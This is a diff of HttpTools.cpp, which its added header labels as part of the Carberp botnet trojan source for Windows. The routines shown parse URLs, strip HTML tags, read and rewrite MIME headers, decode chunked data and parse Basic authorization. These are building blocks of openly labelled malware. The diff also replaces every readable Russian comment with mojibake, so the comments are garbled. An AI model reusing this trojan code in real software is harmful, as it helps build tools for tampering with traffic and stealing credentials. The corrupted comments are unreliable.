@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <windows.h>
@@ -27,7 +38,7 @@ LPSTR HttpTools::_findValueInUrlEncoded(const void *list, DWORD listSize, const 
 
   while((curVar = Str::_findSubStringA(p, varable)) != NULL)
   {
-    //Переменная найдена.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(curVar[varableSize] == '=' && (curVar == (LPSTR)list || *(curVar - 1) == '&')) 
     {
       LPSTR val    = curVar + varableSize + 1;
@@ -58,7 +69,7 @@ bool HttpTools::_parseUrl(const LPSTR url, URLDATA *ud)
   
   Mem::_zero(ud, sizeof(URLDATA));
 
-  //Хост.
+  //пїЅпїЅпїЅпїЅ.
   if((ud->host = Str::_CopyExA(uc.lpszHostName, uc.dwHostNameLength)) == NULL)
   {
     return false;
@@ -66,8 +77,8 @@ bool HttpTools::_parseUrl(const LPSTR url, URLDATA *ud)
 
   //URI.
   {
-    //Пропускаем '/'. Типо совместимость, т.к. в MSDN не написано об обезателном наличии или
-    //отсувии слеша.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ '/'. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ.пїЅ. пїЅ MSDN пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
     while(uc.dwUrlPathLength > 0 && *uc.lpszUrlPath == '/')
     {
       uc.dwUrlPathLength--;
@@ -89,10 +100,10 @@ bool HttpTools::_parseUrl(const LPSTR url, URLDATA *ud)
     ud->uriExtraOffset = 1 + uc.dwUrlPathLength;
   }
 
-  //Порт.
+  //пїЅпїЅпїЅпїЅ.
   ud->port = uc.nPort;
 
-  //Тип
+  //пїЅпїЅпїЅ
   switch(uc.nScheme)
   {
     case INTERNET_SCHEME_HTTP:  ud->scheme = UDS_HTTP; break;
@@ -116,7 +127,7 @@ LPWSTR HttpTools::_getFileNameFromUrl(const LPSTR url)
   
   if(_parseUrl(url, &ud))
   {
-    //Убираем доп данные.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     ud.uri[ud.uriExtraOffset] = 0;
     
     LPSTR fileName = Str::_findRCharA(ud.uri, '/');
@@ -155,7 +166,7 @@ bool HttpTools::_compareTagNameA(const LPSTR tag, DWORD tagSize, const LPSTR str
 #define SYMB_SPACE           "nbsp;"
 #define SYMB_SPACE_SIZE      (sizeof(SYMB_SPACE) - 1)
 
-//FIXME: Улучшить алгоритм.
+//FIXME: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 DWORD HttpTools::_removeTagsA(LPSTR string, DWORD size)
 {
   static const LPSTR tags[]       = {"br", "hr", "tr", "td", "div", "h1", "h2", "h3", "h4", "h5", "h6", "li"};
@@ -177,10 +188,10 @@ DWORD HttpTools::_removeTagsA(LPSTR string, DWORD size)
         DWORD curSize = size - oldOffset;
         LPSTR curPos  = string + oldOffset + 1;
 
-        //Ищим  /script
+        //пїЅпїЅпїЅпїЅ  /script
         if(isScript)
         {
-          //FIXME: Если мы встертим внутри скрипта тег "</script>", это будет ошибка.
+          //FIXME: пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ "</script>", пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
           if(curSize > TAG_SCRIPT_SIZE + 1 && *curPos == '/' && _compareTagNameA(TAG_SCRIPT, TAG_SCRIPT_SIZE, curPos + 1))isScript = false;
         }
         else
@@ -208,7 +219,7 @@ DWORD HttpTools::_removeTagsA(LPSTR string, DWORD size)
       }
       else string[newOffset] = string[oldOffset];
       
-      //FIXME: Игнорировать пробелы если уже есть пробел.
+      //FIXME: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
       newOffset++;
     }
     oldOffset++;
@@ -292,7 +303,7 @@ LPSTR HttpTools::_getMimeHeader(const void *mimeData, DWORD mimeSize, const LPST
     LPSTR cur      = data;
     SIZE_T curSize = Str::_getCurrentStringSizeA(data, dataEnd, &data);
 
-    //Если пустая строка.
+    //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     if(curSize == 0)
     {
       if((DWORD_PTR)header == GMH_DATA)
@@ -300,13 +311,13 @@ LPSTR HttpTools::_getMimeHeader(const void *mimeData, DWORD mimeSize, const LPST
         *size = (SIZE_T)(dataEnd - data);
         return data;
       }
-      return NULL; //После пустой строки уже нет заголовков.
+      return NULL; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     }
 
-    //Эти данные могут быть получены только с первой строки.
+    //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     if(cur == (LPSTR)mimeData && ((DWORD_PTR)header == GMH_HTTP_METHOD || (DWORD_PTR)header == GMH_HTTP_URI || (DWORD_PTR)header == GMH_REQUEST_HTTP_VERSION))
     {
-      //Ищим все пробелы.
+      //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       LPSTR spaces[2];
       DWORD count = 0;
 
@@ -352,7 +363,7 @@ DWORD HttpTools::_removeMimeHeader(void *mimeData, DWORD mimeSize, const LPSTR h
     LPSTR cur      = data;
     SIZE_T curSize = Str::_getCurrentStringSizeA(data, dataEnd, &data);
 
-    //После пустой строки уже нет заголовков.
+    //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(curSize == 0)break;
 
     if(curSize > headerSize && StrCmpNIA(header, cur, headerSize) == 0 && cur[headerSize] == ':')
@@ -380,17 +391,17 @@ DWORD HttpTools::_modifyMimeHeader(void *mimeData, DWORD mimeSize, const LPSTR h
     LPSTR cur      = data;
     SIZE_T curSize = Str::_getCurrentStringSizeA(data, dataEnd, &data);
 
-    //После пустой строки уже нет заголовков.
+    //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     if(curSize == 0)break;
 
     if(curSize > headerSize && StrCmpNIA(header, cur, headerSize) == 0 && cur[headerSize] == ':')
     {
       SIZE_T postfixSize = (SIZE_T)(dataEnd - data);
-      LPSTR tmpBuf; //FIXME: Это лень мозга, сделать алгоритм.
+      LPSTR tmpBuf; //FIXME: пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
        
       if(postfixSize > 0 && (tmpBuf = (LPSTR)Mem::copyEx(data, postfixSize)) == NULL)continue;
 
-      curSize = headerSize + 1; //Символ ':'.
+      curSize = headerSize + 1; //пїЅпїЅпїЅпїЅпїЅпїЅ ':'.
       if(contextSize > 0)
       {
         cur[curSize++] = ' ';
@@ -398,7 +409,7 @@ DWORD HttpTools::_modifyMimeHeader(void *mimeData, DWORD mimeSize, const LPSTR h
         curSize += contextSize;
       }
       
-      //Это закон RFC, варинат с только \n не рассматриваем.
+      //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ RFC, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ \n пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       cur[curSize++] = '\r';
       cur[curSize++] = '\n';
       
@@ -454,10 +465,10 @@ void *HttpTools::_readChunkedData(const void *data, DWORD dataSize, void **chunk
   LPSTR p   = (LPSTR)data;
   LPSTR end = p + dataSize;
 
-  //Читаем.
-  if(Str::_getCurrentStringSizeA(p, end, (LPSTR *)chunkedData) > 0) //FIXME: проверять наличие \r\n
+  //пїЅпїЅпїЅпїЅпїЅпїЅ.
+  if(Str::_getCurrentStringSizeA(p, end, (LPSTR *)chunkedData) > 0) //FIXME: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ \r\n
   {    
-    *chunkedDataSize = Str::_hexStringToDwordA(p); //Читает, пока не втретиться символ отличный от 0-F.
+    *chunkedDataSize = Str::_hexStringToDwordA(p); //пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ 0-F.
     
     p = ((LPSTR)*chunkedData) + *chunkedDataSize;
     
@@ -506,7 +517,7 @@ bool HttpTools::_parseAuthorization(const LPSTR source, DWORD sourceSize, LPWSTR
   if(sourceSize > 6 && Str::_CompareA("Basic ", source, 6, 6) == 0)
   {
     LPSTR p = (LPSTR)source + 6;
-    while(IS_SPACE_CHAR(*p))p++; //На всякий случай. Строка 100% коначается на ноль.
+    while(IS_SPACE_CHAR(*p))p++; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ 100% пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ.
 
     LPSTR decoded;
     SIZE_T decodedSize;
